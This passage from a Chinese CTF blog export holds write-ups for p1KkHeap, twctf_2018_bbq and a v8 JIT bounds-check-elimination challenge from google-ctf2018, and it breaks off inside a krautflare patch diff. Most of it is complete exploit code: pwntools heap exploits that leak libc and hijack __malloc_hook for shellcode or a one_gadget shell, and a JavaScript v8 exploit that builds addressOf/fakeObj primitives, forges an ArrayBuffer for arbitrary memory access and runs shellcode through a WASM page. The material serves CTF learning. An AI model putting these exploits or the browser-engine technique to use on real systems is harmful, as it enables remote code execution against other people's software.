\n\n最终，我们得到了flag\n\n\n综上，我们的exp脚本如下\n#coding:utf8  #思想:攻击tcache表头  from pwn import *    #sh = process(&#x27;./p1KkHeap&#x27;)  context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)  sh = remote(&#x27;39.98.64.24&#x27;,9091)  #libc_path = &#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;  libc_path = &#x27;./libc.so.6&#x27;  libc = ELF(libc_path)  malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]  open_s = libc.sym[&#x27;open&#x27;]  read_s = libc.sym[&#x27;read&#x27;]  write_s = libc.sym[&#x27;write&#x27;]    def create(size):     sh.sendlineafter(&#x27;Your Choice:&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;size:&#x27;,str(size))    def show(index):     sh.sendlineafter(&#x27;Your Choice:&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;id:&#x27;,str(index))    def edit(index,content):     sh.sendlineafter(&#x27;Your Choice:&#x27;,&#x27;3&#x27;)     sh.sendlineafter(&#x27;id:&#x27;,str(index))     sh.sendafter(&#x27;content:&#x27;,content)    def delete(index):     sh.sendlineafter(&#x27;Your Choice:&#x27;,&#x27;4&#x27;)     sh.sendlineafter(&#x27;id:&#x27;,str(index))    #chunk0  create(0x100)  #chunk1，用来挡住chunk0与top块，这样chunk0放入unsorted bin时不会发生合并，指针就会保留在chunk0中  create(0x40)    #chunk0和自己形成双向链表  delete(0)  delete(0)  #泄露chunk0的堆地址  show(0)  sh.recvuntil(&#x27;content: &#x27;)  heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - 0x10    #得到tcache存放表头的地址  tcache_head_addr = heap_addr - 0x188    #chunk2  create(0x100)  #将chunk0的fd指向表头指针处  edit(2,p64(tcache_head_addr))  #chunk3  create(0x100)  #chunk4，chunk4是tcache存放表头指针的位置，我们edit chunk4，就能修改tcache的表头  #现在tcache 的count变成了-1，由于是无符号数，导致比较时&gt;7成立  create(0x100)  #chunk0进入unsorted bin  delete(0)  #泄露main_arena+96的地址  show(0)  sh.recvuntil(&#x27;content: &#x27;)    main_arena_96 = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))  malloc_hook_addr = (main_arena_96 &amp; 0xFFFFFFFFFFFFFF00) + (malloc_hook_s &amp; 0xFF)  libc_base = malloc_hook_addr - malloc_hook_s  open_addr = libc_base + open_s  read_addr = libc_base + read_s  write_addr = libc_base + write_s      #将表头指向0x66660000，这样我们就能分配到这里了  edit(4,p64(0x66660000))    #&#x27;flag.txt&#x27;  shellcode = asm(&#x27;mov rax,0x7478742E67616C66&#x27;)  shellcode += asm(&#x27;push 0x0&#x27;)  shellcode += asm(&#x27;push rax&#x27;)  #rsi = 0  shellcode += asm(&#x27;mov rsi,0&#x27;)  shellcode += asm(&#x27;mov rdi,rsp&#x27;)  #call open  shellcode += asm(&#x27;mov rax,&#x27; + hex(open_addr))  shellcode += asm(&#x27;call rax&#x27;)  #fd  shellcode += asm(&#x27;mov rdi,rax&#x27;)  #buf  shellcode += asm(&#x27;mov rsi,rsp&#x27;)  #len  shellcode += asm(&#x27;mov rdx,0x30&#x27;)  #call read  shellcode += asm(&#x27;mov rax,&#x27; + hex(read_addr))  shellcode += asm(&#x27;call rax&#x27;)  #fd  shellcode += asm(&#x27;mov rdi,1&#x27;)  ##buf  shellcode += asm(&#x27;mov rsi,rsp&#x27;)  #len  shellcode += asm(&#x27;mov rdx,0x30&#x27;)  #call write  shellcode += asm(&#x27;mov rax,&#x27; + hex(write_addr))  shellcode += asm(&#x27;call rax&#x27;)    #chunk5分配到了0x66660000  create(0x100)  #写入shellcode到0x66660000  edit(5,shellcode)    print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)      #将malloc_hook设置为tcache bin表头  edit(4,p64(malloc_hook_addr))  #chunk6分配到malloc_hook处  create(0x100)    #写malloc_hook  edit(6,p64(0x66660000))    #触发malloc hook去执行我们在0x66660000处布下的shellcode  create(0x1)    sh.interactive()  \n\n本题，我学到了绕过tcache bin的新方法，就是使得tcache bin的count为负数，还有就是攻击表头，在这次碰巧学到了，这是以前我不知道的。\n","categories":["CTF"],"tags":["tcache","unsorted bin","malloc_hook"]},{"title":"twctf_2018_bbq","url":"/2020/07/25/twctf_2018_bbq/","content":"首先，检查一下程序的保护机制\n\n\n然后我们用IDA分析一下\n在delete功能里，ptr指针存在未初始化的漏洞，因此可以free在栈上伪造的地址，条件是ptr-&gt;flag得满足要求，另外index下标没有检查，这也是一个漏洞。\n\n\n由于getInput后面的length固定，因此我们最开始只能将栈上的ptr指针低1字节覆盖为0，因此，我们需要在堆里对应的伪造伪造好chunk，然后free掉，形成ovelap chunk。\n\n\nFree时还要特意伪造好flag，否则不能通过检查，并且add_food里使用的strdup来申请堆，因此遇到0会截断，而flag的值不足8字节，因此最多伪造到flag，比较难构造。\n\n\n另外需要注意的是，本题堆大小至多0x50，因此想要用fastbin attack，还得借助amount，由于程序中使用链表管理节点，因此在形成overlap chunk以后，我们伪造链表的next指针为malloc_hook上方某处，然后通过add_food，匹配name相同后，就直接对i-&gt;amount进行了修改，我们令i为malloc_hook_addr - 0x30，那么name就是x00,通过add_food(‘x00’,0x31)，可以将malloc_hook_addr – 0x28修改为0x31，这个0x31就可以给我们伪造chunk的size头了。\n\n\n同时，在堆里伪造程序中链表结构体时，还得借助amount，不然没法实现同时修改fastbin里那个chunk的size和fd指针。\n\n\n就是构造麻烦了点。\n#coding:utf8from pwn import *#context.log_level = &#x27;debug&#x27;#sh = process(&#x27;./twctf_2018_bbq&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)sh = remote(&#x27;node3.buuoj.cn&#x27;,26505)libc = ELF(&#x27;./libc-2.23.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]realloc_s = libc.sym[&#x27;realloc&#x27;]one_gadget = 0xf66f0def buy(name,amount):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;food name &gt;&gt;&#x27;,name)   sh.sendlineafter(&#x27;amount &gt;&gt;&#x27;,str(amount))def cook(name,index = -1):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;which food &gt;&gt;&#x27;,name)   if index != -1:      sh.sendlineafter(&#x27;griddle index &gt;&gt;&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;griddle index &gt;&gt;&#x27;,str(index))buy(&#x27;a&#x27;,100)cook(&#x27;a&#x27;,10)buy(&#x27;b&#x27;*0x20,1)delete(10)buy(&#x27;c&#x27;*0x10 + p64(0xDEADBEEF11),1) #offset = 0x100cook(&#x27;a&#x27;,11) #offset = 0x120cook(&#x27;a&#x27;,12) #offset = 0x140delete(11)buy(p64(0xDEADBEEF11),1) #offset = 0x160cook(&#x27;a&#x27;,13) #offset = 0x180buy(&#x27;d&#x27;*0x10,1) #offset = 0x1A0buy(&#x27;h&#x27;*0x10 + p64(0xDEADBEEF11),1) #offset = 0x200delete(13)buy(p64(0xDEADBEEF11),1)cook(&#x27;a&#x27;,14) #offset =cook(&#x27;a&#x27;,15)cook(&#x27;a&#x27;,16)cook(&#x27;a&#x27;,17)delete(12)  #在栈上留下了一个堆地址cook(&#x27;a&#x27;*0x27) #覆盖堆地址的低1字节为0，正好指向offset=0x100的那个堆delete(100) #ptr指针未初始化，free掉了offset=0x100的那个堆sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;1&#x27;)sh.recvuntil(&#x27;* &#x27;)sh.recvuntil(&#x27;* &#x27;)sh.recvuntil(&#x27;* &#x27;)sh.recvuntil(&#x27;* &#x27;)heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;heap_addr=&#x27;,hex(heap_addr)sh.sendlineafter(&#x27;food name &gt;&gt;&#x27;,&#x27;c&#x27;)sh.sendlineafter(&#x27;amount &gt;&gt;&#x27;,&#x27;0&#x27;)buy(&#x27;c&#x27;*0x8 + p16(0x1C1),2) #offset=0x140，伪造一个unsorted bin chunkcook(&#x27;a&#x27;,18)buy(&#x27;e&#x27;*0x3E,1)cook(&#x27;a&#x27;,19)cook(&#x27;a&#x27;,20)for i in range(21,30):   cook(&#x27;a&#x27;,i)cook(&#x27;a&#x27;*0x28 + p64(heap_addr + 0x20)) #修改栈上ptr指针为fake_chunk#形成overlap chunkdelete(100) #释放offset=0x150的fake_chunkbuy(&#x27;f&#x27;*0x30 + p64(heap_addr  - 0x10),1)delete(18)buy(p64(heap_addr + 0xA0),1)sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;1&#x27;)sh.recvuntil(&#x27;hhh&#x27;)sh.recvuntil(&#x27;* &#x27;)main_arena_88 = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sone_gadget_addr = libc_base + one_gadgetrealloc_addr = libc_base + realloc_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)sh.sendlineafter(&#x27;food name &gt;&gt;&#x27;,&#x27;c&#x27;)sh.sendlineafter(&#x27;amount &gt;&gt;&#x27;,&#x27;0&#x27;)delete(19)buy(&#x27;a&#x27;*0x10 + p64(malloc_hook_addr - 0x30),1) #将malloc_hook_addr接入到程序中的链表节点buy(&#x27;\\x00&#x27;,0x31) #在malloc_hook_addr - 0x28处写上0x31这个数据#delete(16)delete(20)buy(p64(heap_addr),1)delete(16) #放入fastbin#delete(20)#buy(&#x27;i&#x27;*0x10,0x20)buy(&#x27;i&#x27;*0x10,0x31) ##这一个的0x31用来伪造堆的sizedelete(17)delete(21)buy(p64(0xDEADBEEF11),1)cook(&#x27;a&#x27;*0x28 + p64(heap_addr + 0x120)) #修改栈上ptr指针为当前这个chunkdelete(100) #释放这个chunkdelete(22)buy(&#x27;j&#x27;*0x10 + p64(heap_addr + 0x200),1)#现在0x30的fastbin与unsorted bin重合delete(23)buy(p64(malloc_hook_addr - 0x30),0x91) #现在0x30的那个fastbin size变为了0x20，fd指向了malloc_hook_addr - 0x30#把0x30的那个fastbin的size加到0x30buy(&#x27;\\x00&#x27;,0x10)#以下操作将形成head-&gt;next-&gt;next = NULL这样的布局delete(24)delete(25)buy(p64(0xDEADBEEF11),1)cook(&#x27;a&#x27;*0x28 + p64(heap_addr + 0x270)) #修改栈上ptr指针为这个chunkdelete(100) #释放这个chunkdelete(26)buy(&#x27;k&#x27;*0x30 + p64(heap_addr + 0x500),1)delete(28)buy(&#x27;l&#x27;*0x20,1) #取出第一个0x30的fastbin#raw_input()delete(29)buy(&#x27;m&#x27;*0x20 + p64(one_gadget_addr),1) #申请到malloc_hook，改写malloc_hook#getshellcook(&#x27;l&#x27;*0x20,&#x27;\\x00&#x27;)","categories":["CTF"],"tags":["fastbin","下标越界","未初始化漏洞"]},{"title":"v8的JIT边界检查(CheckBounds)消除的利用","url":"/2020/12/29/v8-checkbounds/","content":"文章首发于安全KER https://www.anquanke.com/post/id/226065\n0x00 前言从两道题学习v8中JIT优化的CheckBounds消除在漏洞中的利用\n0x01 前置知识生成IR图在运行d8时加一个--trace-turbo选项，运行完成后，会在当前目录下生成一些json文件，这些便是JIT优化时的IR图数据。\n./d8 --trace-turbo test.js\nTurbolizer搭建我们需要看懂v8的sea of node的IR图，v8为我们准备了一个可视化的IR图查看器Turbolizer，搭建Turbolizer的方法如下（先确保node.js为新版本）\ncd tools/turbolizernpm inpm run-script buildpython -m SimpleHTTPServer\n然后浏览器访问8000端口，即可使用该工具，按CTRL+L可以将v8生成的IR图数据文件加载进来可视化查看\nsea of node学习一个简单的示例，使用--trace-turbo运行\nfunction opt(f) &#123;   var x = f ? 1.1 : 2.2;   x += 1;   x *= 1;   return x;&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt(true);   opt(false);&#125;print(opt(true));\n将生成的json文件用Turbolizer打开左上角有许多的阶段选择，后面的序号代表它们的顺序，首先是TFBytecodeGraphBuilder阶段，该阶段就是简单的将js代码翻译为字节码，点击展开按钮，我们将所有节点展开查看我们的var x = f ? 1.1 : 2.2;被翻译为了一个Phi节点，即其具体值不能在编译时确定，然后使用了SpeculativeNumberAdd和SpeculativeNumberMultiply做了x+=1;x*=1的运算。接下来进入一个比较重要的阶段是TFTyper阶段，该阶段会尽可能的推测出节点的类型其中整数会使用Range来表示，接下来TFTypedLowering阶段会使用更加合适的函数来进行运算在TFSimplifiedLowering阶段，会去掉一些不必要的运算，然后统一类型\nCheckBounds节点在数组下标访问中， CheckBounds用来检查边界，如下一个简单示例\nfunction opt() &#123;   var arr = [1.1,2.2];   var x = 1;   return arr[x];&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt();&#125;print(opt());\n如图，在TFLoadElimination阶段，有CheckBounds检查下标是否越界然而到了simplified lowering阶段，由于已经知道下标没有越界，因此可以直接去掉CheckBounds节点现在假如我们将arr对象放到opt函数外部，那么由于编译的是opt函数，arr的信息JIT不能完全掌握，便不会消除CheckBounds节点\nvar arr = [1.1,2.2];function opt() &#123;   var x = 1;   return arr[x];&#125;\n然而在最新版的v8中，不再有CheckBounds的消除，因为这个对于漏洞利用来说太方便了。\nCheckBounds消除的利用在数值的运算错误漏洞中，在javascript层和JIT优化的代码，两者计算的数值如果不一致，那么就可以利用这种CheckBounds消除来实现数组越界\n0x02 google-ctf2018-final-just-in-timepatch分析diff --git a/BUILD.gn b/BUILD.gnindex c6a58776cd..14c56d2910 100644--- a/BUILD.gn+++ b/BUILD.gn@@ -1699,6 +1699,8 @@ v8_source_set(&quot;v8_base&quot;) &#123;     &quot;src/compiler/dead-code-elimination.cc&quot;,     &quot;src/compiler/dead-code-elimination.h&quot;,     &quot;src/compiler/diamond.h&quot;,+    &quot;src/compiler/duplicate-addition-reducer.cc&quot;,+    &quot;src/compiler/duplicate-addition-reducer.h&quot;,     &quot;src/compiler/effect-control-linearizer.cc&quot;,     &quot;src/compiler/effect-control-linearizer.h&quot;,     &quot;src/compiler/escape-analysis-reducer.cc&quot;,diff --git a/src/compiler/duplicate-addition-reducer.cc b/src/compiler/duplicate-addition-reducer.ccnew file mode 100644index 0000000000..59e8437f3d--- /dev/null+++ b/src/compiler/duplicate-addition-reducer.cc@@ -0,0 +1,71 @@+// Copyright 2018 Google LLC+//+// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);+// you may not use this file except in compliance with the License.+// You may obtain a copy of the License at+//+//      http://www.apache.org/licenses/LICENSE-2.0+//+// Unless required by applicable law or agreed to in writing, software+// distributed under the License is distributed on an &quot;AS IS&quot; BASIS,+// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.+// See the License for the specific language governing permissions and+// limitations under the License.+#include &quot;src/compiler/duplicate-addition-reducer.h&quot;++#include &quot;src/compiler/common-operator.h&quot;+#include &quot;src/compiler/graph.h&quot;+#include &quot;src/compiler/node-properties.h&quot;++namespace v8 &#123;+namespace internal &#123;+namespace compiler &#123;++DuplicateAdditionReducer::DuplicateAdditionReducer(Editor* editor, Graph* graph,+                     CommonOperatorBuilder* common)+    : AdvancedReducer(editor),+      graph_(graph), common_(common) &#123;&#125;++Reduction DuplicateAdditionReducer::Reduce(Node* node) &#123;+  switch (node-&gt;opcode()) &#123;+    case IrOpcode::kNumberAdd:+      return ReduceAddition(node);+    default:+      return NoChange();+  &#125;+&#125;++Reduction DuplicateAdditionReducer::ReduceAddition(Node* node) &#123;+  DCHECK_EQ(node-&gt;op()-&gt;ControlInputCount(), 0);+  DCHECK_EQ(node-&gt;op()-&gt;EffectInputCount(), 0);+  DCHECK_EQ(node-&gt;op()-&gt;ValueInputCount(), 2);++  Node* left = NodeProperties::GetValueInput(node, 0);+  if (left-&gt;opcode() != node-&gt;opcode()) &#123;+    return NoChange();+  &#125;++  Node* right = NodeProperties::GetValueInput(node, 1);+  if (right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;+    return NoChange();+  &#125;++  Node* parent_left = NodeProperties::GetValueInput(left, 0);+  Node* parent_right = NodeProperties::GetValueInput(left, 1);+  if (parent_right-&gt;opcode() != IrOpcode::kNumberConstant) &#123;+    return NoChange();+  &#125;++  double const1 = OpParameter&lt;double&gt;(right-&gt;op());+  double const2 = OpParameter&lt;double&gt;(parent_right-&gt;op());+  Node* new_const = graph()-&gt;NewNode(common()-&gt;NumberConstant(const1+const2));++  NodeProperties::ReplaceValueInput(node, parent_left, 0);+  NodeProperties::ReplaceValueInput(node, new_const, 1);++  return Changed(node);+&#125;++&#125;  // namespace compiler+&#125;  // namespace internal+&#125;  // namespace v8diff --git a/src/compiler/duplicate-addition-reducer.h b/src/compiler/duplicate-addition-reducer.hnew file mode 100644index 0000000000..7285f1ae3e--- /dev/null+++ b/src/compiler/duplicate-addition-reducer.h@@ -0,0 +1,60 @@+/*+ * Copyright 2018 Google LLC+ *+ * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);+ * you may not use this file except in compliance with the License.+ * You may obtain a copy of the License at+ *+ *      http://www.apache.org/licenses/LICENSE-2.0+ *+ * Unless required by applicable law or agreed to in writing, software+ * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.+ * See the License for the specific language governing permissions and+ * limitations under the License.+ */++#ifndef V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_+#define V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_++#include &quot;src/base/compiler-specific.h&quot;+#include &quot;src/compiler/graph-reducer.h&quot;+#include &quot;src/globals.h&quot;+#include &quot;src/machine-type.h&quot;++namespace v8 &#123;+namespace internal &#123;+namespace compiler &#123;++// Forward declarations.+class CommonOperatorBuilder;+class Graph;++class V8_EXPORT_PRIVATE DuplicateAdditionReducer final+    : public NON_EXPORTED_BASE(AdvancedReducer) &#123;+ public:+  DuplicateAdditionReducer(Editor* editor, Graph* graph,+                      CommonOperatorBuilder* common);+  ~DuplicateAdditionReducer() final &#123;&#125;++  const char* reducer_name() const override &#123; return &quot;DuplicateAdditionReducer&quot;; &#125;++  Reduction Reduce(Node* node) final;++ private:+  Reduction ReduceAddition(Node* node);++  Graph* graph() const &#123; return graph_;&#125;+  CommonOperatorBuilder* common() const &#123; return common_; &#125;;++  Graph* const graph_;+  CommonOperatorBuilder* const common_;++  DISALLOW_COPY_AND_ASSIGN(DuplicateAdditionReducer);+&#125;;++&#125;  // namespace compiler+&#125;  // namespace internal+&#125;  // namespace v8++#endif  // V8_COMPILER_DUPLICATE_ADDITION_REDUCER_H_diff --git a/src/compiler/pipeline.cc b/src/compiler/pipeline.ccindex 5717c70348..8cca161ad5 100644--- a/src/compiler/pipeline.cc+++ b/src/compiler/pipeline.cc@@ -27,6 +27,7 @@ #include &quot;src/compiler/constant-folding-reducer.h&quot; #include &quot;src/compiler/control-flow-optimizer.h&quot; #include &quot;src/compiler/dead-code-elimination.h&quot;+#include &quot;src/compiler/duplicate-addition-reducer.h&quot; #include &quot;src/compiler/effect-control-linearizer.h&quot; #include &quot;src/compiler/escape-analysis-reducer.h&quot; #include &quot;src/compiler/escape-analysis.h&quot;@@ -1301,6 +1302,8 @@ struct TypedLoweringPhase &#123;                                data-&gt;jsgraph()-&gt;Dead());     DeadCodeElimination dead_code_elimination(&amp;graph_reducer, data-&gt;graph(),                                               data-&gt;common(), temp_zone);+    DuplicateAdditionReducer duplicate_addition_reducer(&amp;graph_reducer, data-&gt;graph(),+                                              data-&gt;common());     JSCreateLowering create_lowering(&amp;graph_reducer, data-&gt;dependencies(),                                      data-&gt;jsgraph(), data-&gt;js_heap_broker(),                                      data-&gt;native_context(), temp_zone);@@ -1318,6 +1321,7 @@ struct TypedLoweringPhase &#123;                                          data-&gt;js_heap_broker(), data-&gt;common(),                                          data-&gt;machine(), temp_zone);     AddReducer(data, &amp;graph_reducer, &amp;dead_code_elimination);+    AddReducer(data, &amp;graph_reducer, &amp;duplicate_addition_reducer);     AddReducer(data, &amp;graph_reducer, &amp;create_lowering);     AddReducer(data, &amp;graph_reducer, &amp;constant_folding_reducer);     AddReducer(data, &amp;graph_reducer, &amp;typed_optimization);\npatch文件在TypedLoweringPhase阶段增加了一个自定义的优化方案，它会检查该阶段的Opcode，如果遇到kNumberAdd，并且两个操作数为NumberConstant类型，那么就会将结果运算以后，替换节点\n+Reduction DuplicateAdditionReducer::Reduce(Node* node) &#123;+  switch (node-&gt;opcode()) &#123;+    case IrOpcode::kNumberAdd:+      return ReduceAddition(node);+    default:+      return NoChange();+  &#125;+&#125;\n使用如下测试\nfunction opt(f) &#123;   var x = f ? 1.1:2.2;   var y = x + 1 + 1;   return y;&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt(true);   opt(false);&#125;print(opt(true));\n在typer阶段时，使用了两次SpeculativeNumberAdd[Number]来进行加1而到了TypedLowering阶段，由于使用的是NumberAdd，因此1+1直接被优化计算出来了假如使用如下的代码，发现不会使用NumberAdd，由此知道NumberAdd出现在不同的数值类型之间\nfunction opt(f) &#123;   var x = f ? 1:2;   var y = x + 1 + 1;   return y;&#125;\n漏洞利用需要借助IEE754的精度丢失来达到利用，在IEE754中，能够准确表示的最大整数为9007199254740991，大于这个数进行运算的话，会出现错误。比如\nvar x = 9007199254740991;x += 1;x += 1;x += 1;x += 1;x += 1;print(x);root@ubuntu:~/Desktop/google-ctf2018-final-just-in-time/debug# ./d8 1.js9007199254740992\n而\nvar x = 9007199254740991;x += 5;print(x);root@ubuntu:~/Desktop/google-ctf2018-final-just-in-time/debug# ./d8 1.js9007199254740996\n因此，由于patch的加入，原本我们的x + 1 + 1与优化后的x + 2可能并不相等，那么就有可能在优化后造成数组越界。首先构造\nfunction opt() &#123;   var arr = [1.1,2.2,3.3,4.4,5.5,6.6];   var x = Number.MAX_SAFE_INTEGER + 4;   var y = x + 1 + 1;   var index = y - (Number.MAX_SAFE_INTEGER + 1);   return arr[index];&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt();&#125;print(opt());\n发现并没有成功越界，查看IR图由于opt里面全都是NumberConstants，导致所有的加法都被优化了，而我们仅仅想要优化1+1，由此，我们可以构造一个Phi节点\nfunction opt(f) &#123;   var arr = [1.1,2.2,3.3,4.4,5.5,6.6];   var x = f ? Number.MAX_SAFE_INTEGER + 4:Number.MAX_SAFE_INTEGER+1;   var y = x + 1 + 1;   var index = y - (Number.MAX_SAFE_INTEGER + 1);   return arr[index];&#125;for (var i=0;i&lt;0x20000;i++) &#123;   opt(true);   opt(false);&#125;print(opt(true));\n发现这回成功溢出\nroot@ubuntu:~/Desktop/google-ctf2018-final-just-in-time/debug# ./d8 1.js --trace-turboConcurrent recompilation has been disabled for tracing.---------------------------------------------------Begin compiling method opt using Turbofan---------------------------------------------------Finished compiling method opt using Turbofan---------------------------------------------------Begin compiling method  using Turbofan---------------------------------------------------Finished compiling method  using Turbofan-1.1885946300594787e+148\n分析IR图，patch的优化后于NumberAdd等，因此在最后一步减法NumberSubtract后，确定了Range(0,4)，显然这个范围不会越界，但是接下来patch的优化将NumberAdd(1,1)优化为了2，那么最终结果已发生变化，但是没有更新CheckBounds的范围那么到达simplified lowering时，CheckBounds就会被移除，那么就可以溢出了那么构造fakeObj和addressOf原语，然后利用即可exp\nvar buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function i2f64(value) &#123;   dv.setBigUint64(0,BigInt(value),true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return dv.getBigUint64(0,true);&#125;var arr;function opt(f) &#123;   arr = [1.1,2.2,3.3,4.4,5.5,6.6];   var b = f ? Number.MAX_SAFE_INTEGER+0x4:Number.MAX_SAFE_INTEGER+0x1;   var c = b+1+1;   var index = c - (Number.MAX_SAFE_INTEGER + 1);   return arr[index];&#125;for (var i=0;i&lt;0x30000;i++) &#123;   opt(true);   opt(false);&#125;var obj = &#123;&#125;;double_elements_map_addr = u64f(opt(true)) - 0x1n;var obj_arr = [obj];var obj_elements_map = i2f64(double_elements_map_addr + 0xa1n);print(&quot;double_elements_map=&quot; + double_elements_map_addr.toString(16));print(&quot;obj_elements_map=&quot; + u64f(obj_elements_map).toString(16));function fakeObj_opt(addr,f) &#123;   arr = [addr,2.2,3.3,4.4,5.5,6.6];   var b = f ? Number.MAX_SAFE_INTEGER+0x4:Number.MAX_SAFE_INTEGER+0x1;   var c = b+1+1;   var index = c - (Number.MAX_SAFE_INTEGER + 1);   arr[index] = obj_elements_map;   return arr;&#125;for (var i=0;i&lt;0x30000;i++) &#123;   fakeObj_opt(1.1+i,true);   fakeObj_opt(1.1+i,false);&#125;function fakeObj(addr) &#123;   var addr_f = i2f64(addr + 0x1n);   return fakeObj_opt(addr_f,true)[0];&#125;var double_elements_map_obj = fakeObj(double_elements_map_addr);function addressOf_opt(obj,f) &#123;   arr = [obj,obj,obj,obj,obj,obj];   var b = f ? Number.MAX_SAFE_INTEGER+0x4:Number.MAX_SAFE_INTEGER+0x1;   var c = b+1+1;   var index = c - (Number.MAX_SAFE_INTEGER + 1);   arr[index] = double_elements_map_obj;   return arr;&#125;for (var i=0;i&lt;0x30000;i++) &#123;   addressOf_opt(obj,true);   addressOf_opt(obj,false);&#125;function addressOf(obj) &#123;   var a = addressOf_opt(obj,true)[0];   return u64f(a) - 0x1n;&#125;const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];var faker_addr = addressOf(faker);/*print(&#x27;wasm=&#x27;+addressOf(wasmInstance).toString(16));%DebugPrint(wasmInstance);%SystemBreak();*/wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0xf8n;var element_addr = faker_addr - 0x50n;//print(&#x27;element_addr=&#x27; + element_addr.toString(16));//fake a ArrayBuffer&#x27;s Mapfaker[0] = i2f64(0n);faker[1] = i2f64(0x1900042317080808n);faker[2] = i2f64(0x00000000082003ffn);faker[3] = i2f64(0);//faker a ArrayBufferfaker[4] = i2f64(element_addr+0x1n); //mapfaker[5] = i2f64(0); //propertiesfaker[6] = i2f64(0); //elementsfaker[7] = p64f(0xffffffff,0); //lengthfaker[8] = i2f64(wasm_shellcode_ptr_addr);faker[9] = 0x2;var arb_ArrayBuffer = fakeObj(element_addr+0x20n);var adv = new DataView(arb_ArrayBuffer);var wasm_shellcode_addr = adv.getBigUint64(0,true);print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));faker[8] = i2f64(wasm_shellcode_addr);//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   adv.setUint32(i*4,shellcode[i],true);&#125;//执行shellcodefunc();\n在addressOf_opt和fakeObj_opt中，我们没有直接返回arr[0]这是因为arr在opt函数内部，编译时收集的信息足够充分，即使我们改了map，也不影响其取出的值，因此，我们要返回整个arr对象。\n0x03 35c3ctf-krautflarepatch分析commit 950e28228cefd1266cf710f021a67086e67ac6a6Author: Your Name &lt;you@example.com&gt;Date:   Sat Dec 15 14:59:37 2018 +0100    Revert &quot;[turbofan] Fix Math.expm1 builtin typing.&quot;        This reverts commit c59c9c46b589deb2a41ba07cf87275921b8b2885.diff --git a/src/compiler/typer.cc b/src/compiler/typer.ccindex 60e7ed574a..8324dc06d7 100644--- a/src/compiler/typer.cc+++ b/src/compiler/typer.cc@@ -1491,6 +1491,7 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;     // Unary math functions.     case BuiltinFunctionId::kMathAbs:     case BuiltinFunctionId::kMathExp:+    case BuiltinFunctionId::kMathExpm1:       return Type::Union(Type::PlainNumber(), Type::NaN(), t-&gt;zone());     case BuiltinFunctionId::kMathAcos:     case BuiltinFunctionId::kMathAcosh:@@ -1500,7 +1501,6 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;     case BuiltinFunctionId::kMathAtanh:     case BuiltinFunctionId::kMathCbrt:     case BuiltinFunctionId::kMathCos:-    case 